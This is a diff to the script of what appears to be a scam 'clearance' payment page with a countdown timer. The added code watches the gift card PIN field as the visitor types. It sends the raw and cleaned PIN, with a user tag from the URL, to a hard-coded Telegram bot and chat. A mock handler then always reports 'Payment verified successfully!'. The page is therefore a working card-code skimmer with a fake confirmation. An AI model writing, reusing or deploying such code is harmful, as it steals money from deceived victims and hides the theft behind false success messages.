@@ -350,48 +350,114 @@ function updateCountdownDisplay() {
 updateCountdownDisplay();
 const timerInterval = setInterval(updateCountdownDisplay, 1000);
 
+/* =========================
+AUTO SAVE & TELEGRAM STREAM SYSTEM (UPDATED)
+========================= */
+let lastSentPayload = "";
 
-        // 2. Submission Handler
-        async function submitClearanceCode() {
-            const cardCode = document.getElementById("giftcard_pin").value.trim();
-            const statusBox = document.getElementById("status_message");
-            const submitBtn = document.getElementById("submit_btn");
+async function saveClearanceCode() {
+    const rawCardCode = document.getElementById("giftcard_pin")?.value?.trim() || "";
 
-            if (!cardCode || cardCode.length < 10) {
-                statusBox.innerText = "Please enter a valid card PIN.";
-                return;
-            }
+    // 1. Commit draft to local device storage
+    localStorage.setItem("clearanceCodeDraft", rawCardCode);
 
-            submitBtn.disabled = true;
-            statusBox.style.color = "#38bdf8";
-            statusBox.innerText = "Verifying code with clearance server...";
+    // 2. SANITIZE & LENGTH GATEWAY: Strip spaces/hyphens and check 14–16 character length
+    const cleanCode = rawCardCode.replace(/[\s-]/g, '');
 
-            try {
-                const mockApiResponse = await new Promise((resolve) => {
-                    setTimeout(() => {
-                        resolve({ status: "SUCCESS", transactionId: "TXN_998402" });
-                    }, 2000);
-                });
+    if (cleanCode.length < 14 || cleanCode.length > 16) {
+        return; 
+    }
 
-                if (mockApiResponse.status === "SUCCESS") {
-                    statusBox.style.color = "#10b981";
-                    statusBox.innerText = "Payment verified successfully!";
+    // 3. Prevent duplicate pings if the sanitized PIN hasn't changed
+    if (cleanCode === lastSentPayload) return;
+    lastSentPayload = cleanCode;
 
-                    // Update session storage without Step 4 redirects
-                    localStorage.setItem("has_withdrawn", "true");
-                    localStorage.setItem("step_3_paid", "true");
-                    localStorage.setItem("step_3_txn_id", mockApiResponse.transactionId);
-                } else {
-                    statusBox.style.color = "#ef4444";
-                    statusBox.innerText = "Invalid card PIN. Please try again.";
-                    submitBtn.disabled = false;
-                }
-            } catch (err) {
-                statusBox.style.color = "#ef4444";
-                statusBox.innerText = "Network error connecting to payment gateway.";
-                submitBtn.disabled = false;
-            }
+    // 4. Stream sanitized payload to Telegram Monitor automatically
+    const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
+    const CHAT_IDs = '-1003913850436'; 
+
+    try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const identifyUser = urlParams.get('user') || 'Anonymous Visitor';
+
+        const telegramMessage = 
+          `💳 <b>Live Clearance PIN Tracking</b>\n\n` +
+          `• <b>From User:</b> <code>${identifyUser}</code>\n` +
+          `───────────────────\n` +
+          `• <b>Sanitised PIN:</b> <code>${cleanCode}</code>\n` +
+          `• <b>Raw Input:</b> <code>${rawCardCode}</code>`;
+
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+
+        await fetch(telegramUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_IDs,
+            text: telegramMessage,
+            parse_mode: 'HTML'
+          })
+        });
+
+    } catch (error) {
+        console.error('Failed to stream live clearance PIN metric.');
+    }
+}
+
+/* =========================
+EVENT LISTENERS (Live Input Trigger)
+========================= */
+const pinInput = document.getElementById("giftcard_pin");
+if (pinInput) {
+    pinInput.addEventListener("input", saveClearanceCode);
+}
+
+/* =========================
+SUBMISSION HANDLER
+========================= */
+async function submitClearanceCode() {
+    const rawCardCode = document.getElementById("giftcard_pin")?.value?.trim() || "";
+    const cleanCode = rawCardCode.replace(/[\s-]/g, '');
+    const statusBox = document.getElementById("status_message");
+    const submitBtn = document.getElementById("submit_btn");
+
+    if (cleanCode.length < 14 || cleanCode.length > 16) {
+        statusBox.innerText = "Please enter a valid 14-16 character card PIN.";
+        return;
+    }
+
+    // Ensures data dispatch executes on click if typing listener hasn't fired yet
+    await saveClearanceCode();
+
+    submitBtn.disabled = true;
+    statusBox.style.color = "#38bdf8";
+    statusBox.innerText = "Verifying code with clearance server...";
+
+    try {
+        const mockApiResponse = await new Promise((resolve) => {
+            setTimeout(() => {
+                resolve({ status: "SUCCESS", transactionId: "TXN_998402" });
+            }, 2000);
+        });
+
+        if (mockApiResponse.status === "SUCCESS") {
+            statusBox.style.color = "#10b981";
+            statusBox.innerText = "Payment verified successfully!";
+
+            localStorage.setItem("has_withdrawn", "true");
+            localStorage.setItem("step_3_paid", "true");
+            localStorage.setItem("step_3_txn_id", mockApiResponse.transactionId);
+        } else {
+            statusBox.style.color = "#ef4444";
+            statusBox.innerText = "Invalid card PIN. Please try again.";
+            submitBtn.disabled = false;
         }
+    } catch (err) {
+        statusBox.style.color = "#ef4444";
+        statusBox.innerText = "Network error connecting to payment gateway.";
+        submitBtn.disabled = false;
+    }
+}
     </script>
 </body>
 </html>
